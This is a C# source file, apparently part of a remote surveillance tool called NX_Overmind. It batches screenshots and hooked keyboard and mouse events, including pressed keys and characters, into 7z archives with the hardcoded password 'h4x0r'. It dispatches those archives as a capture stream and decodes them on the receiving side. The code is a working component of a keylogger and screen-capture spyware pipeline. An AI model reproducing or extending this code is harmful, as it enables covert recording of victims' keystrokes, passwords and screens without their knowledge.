using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using NX.Hooks;
using NX.Collections;

namespace NX_Overmind.Actions
{
    public partial class ActionCenter
    {
        
        private class BufferedOperator
        {
            public delegate void BufferedOperationCompleteHandler(int owner, CompressionEventArgs e, bool errorOccured);
            public event BufferedOperationCompleteHandler OnComplete = null;

            private class BufferedTask
            {
                public int Owner;
                public DisposableDirectory Directory;
                public string[] Files;
                public bool Compress;                

                public BufferedTask(int owner, bool compress, DisposableDirectory ddir, string[] files)
                {
                    this.Owner = owner;
                    this.Compress = compress;
                    this.Directory = ddir;
                    this.Files = files;
                }
            }
            private readonly object _lock = new object();
            private Thread _performer = null;
            private Queue<BufferedTask> _bufferQueue = null;
            private int _owner = 0;

            public BufferedOperator()
            {
                this._bufferQueue = new Queue<BufferedTask>();                
            }            

            public void AddTask(int owner, bool compress, DisposableDirectory ddir, string[] files)
            {                
                lock (this._lock)
                {                    
                    this._bufferQueue.Enqueue(new BufferedTask(owner, compress, ddir, files));
                }
                this._performer = new Thread(new ThreadStart(this.PerformTask));
                this._performer.Start();                
            }

            private void PerformTask()
            {
                lock (this._lock)
                {                    
                    while (this._bufferQueue.Count != 0)
                    {
                        BufferedTask task = this._bufferQueue.Dequeue();
                        this._owner = task.Owner;
                        Compression7z cmp = new Compression7z(true);
                        cmp.OnComplete += new Compression7z.ProcessEventHandler(cmp_OnComplete);
                        if(task.Compress)
                            cmp.CompressFiles(true, task.Files[0], Compression7z.Type._7z, Compression7z.Compression.Ultra, task.Files, null, "h4x0r");
                        else
                            cmp.ExtractFile(true, task.Files[0], Compression7z.Type._7z, Compression7z.Compression.Ultra, "h4x0r");                          
                        
                        task.Directory.Dispose();
                    }
                }                
            }

            void cmp_OnComplete(CompressionEventArgs e, bool errorOccured)
            {                
                if (this.OnComplete != null)
                    this.OnComplete(this._owner, e, errorOccured);                
            }
        }
        public delegate void CaptureEventHandler(int owner, Image screenShot, HookEventArgs[] eventArgs);
        public event CaptureEventHandler ReceivedCapture;
        private DisposableDirectory _encodeDisposeDir = new DisposableDirectory();
        private DisposableDirectory _decodeDisposeDir = null;        
        private Queue<string> __staticCompressionQueue = new Queue<string>();
        private BufferedOperator _bufferedOperator = new BufferedOperator();

        public int CaptureQuality = 75;
        public float CaptureShrinkFactor = 0.4f;
        public int CaptureBufferCount = 10;
        public int CaptureInterval = 500;

        public void EncodeCapture(CapturePacket cPacket)
        {
            cPacket.ParentDirectory = this._encodeDisposeDir.DirectoryPath;            
            this.__staticCompressionQueue.Enqueue(cPacket.WriteEncoded(null));

            // Compress if limit
            if (this.__staticCompressionQueue.Count == this.CaptureBufferCount)
            {                
                this._bufferedOperator.AddTask(0, true, this._encodeDisposeDir, this.__staticCompressionQueue.ToArray());
                this._encodeDisposeDir = new DisposableDirectory();
                this.DebugEvent("New encodeDDir: " + this._encodeDisposeDir);
                /*Compression7z cmp = new Compression7z(true);
                cmp.OnComplete += new Compression7z.ProcessEventHandler(cmp_OnComplete);
                cmp.CompressFiles(true, this.__staticCompressionQueue.Peek(), Compression7z.Type._7z, Compression7z.Compression.Ultra, this.__staticCompressionQueue.ToArray(), null, "h4x0r");
                 */ 
                this.__staticCompressionQueue = new Queue<string>();                
            }
        }

        protected void DecodeCapture(int owner, byte[] bytes)
        {
            //string path = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            this._decodeDisposeDir = new DisposableDirectory();
            this.DebugEvent("New decodeDDir: " + this._decodeDisposeDir);
            string fileName = Path.Combine(this._decodeDisposeDir.DirectoryPath, Path.GetRandomFileName())+".7z";

            File.WriteAllBytes(fileName, bytes);
            this._bufferedOperator.AddTask(owner, false, this._decodeDisposeDir, new string[] { fileName });
            this.DebugEvent("Decompress: " + fileName);
            /*Compression7z cmp = new Compression7z(this._decodeDisposeDir.DirectoryPath, true);
            cmp.OnComplete += new Compression7z.ProcessEventHandler(cmp_OnComplete);
            cmp.ExtractFile(false, fileName, Compression7z.Type._7z, Compression7z.Compression.Ultra, "h4x0r");*/
        }

        void cmp_OnComplete(int owner, CompressionEventArgs e, bool errorOccured)
        {            
            this.DebugEvent("7z: " + e.Operation.ToString() + ", " + errorOccured);
            if (e.Operation == NX.Collections.Action.Compress)
            {
                if (!errorOccured && File.Exists(e.TargetFile))
                    this.DispatchData(Type.CaptureStream, File.ReadAllBytes(e.TargetFile+".7z"));
                    //this.SendData(File.ReadAllBytes(e.TargetFile));
                //new DisposableDirectory(Path.GetPathRoot(e.TargetFile), Path.GetDirectoryName(e.TargetFile)).Dispose();
                //this._encodeDisposeDir.Dispose();
                //this._encodeDisposeDir = new DisposableDirectory();
            }
            else
            {                
                if (!errorOccured)
                {
                    File.Delete(e.TargetFile);
                    this.DebugEvent("Checking files in: " + Directory.GetParent(e.TargetFile).FullName);
                    foreach (string f in Directory.GetFiles(Directory.GetParent(e.TargetFile).FullName))
                    {                        
                        CapturePacket cp = new CapturePacket();
                        cp.ReadDecoded(f);                        
                        if(this.ReceivedCapture!=null)
                            this.ReceivedCapture(owner, (cp.ScreenShot.Length != 0)?Image.FromStream(cp.ScreenShot):null, this.DecodeHookEvents(cp.Log));
                    }
                    
                }
                //this._decodeDisposeDir.Dispose();
            }
        }

        private HookEventArgs[] DecodeHookEvents(Stream ls)
        {
            List<HookEventArgs> hookEvents = new List<HookEventArgs>();

            MemoryStream ms = ls as MemoryStream;
            HookEventCodec.EventClass ec;
            HookEventCodec.EventType et;
            HookEventArgs ha;
            byte[] pressedKeys;
            char pressedChar;
            int offset = 0;
            while (HookEventCodec.GetDecodedData(offset, ms.ToArray(), out ec, out et, out ha, out pressedKeys, out pressedChar))
            {
                if (ec == HookEventCodec.EventClass.MouseEvent)
                {
                    ha = new MouseHookEventArgsEx(ha as MouseHookEventArgs, et);
                    offset += (int)HookEventCodec.Offsets.MouseLogOffset;
                }
                else
                {
                    KeyHookEventArgs e = ha as KeyHookEventArgs;
                    List<System.Windows.Forms.Keys> pKeys = new List<System.Windows.Forms.Keys>();
                    foreach (byte b in pressedKeys)
                        if (b != 0)
                            pKeys.Add((System.Windows.Forms.Keys)b);

                    offset += (int)HookEventCodec.Offsets.KeyLogOffset;
                    ha = new KeyHookEventArgsEx(e, et, pKeys, pressedChar);
                }
                hookEvents.Add(ha);
            }
            return hookEvents.ToArray();
        }        
    }
}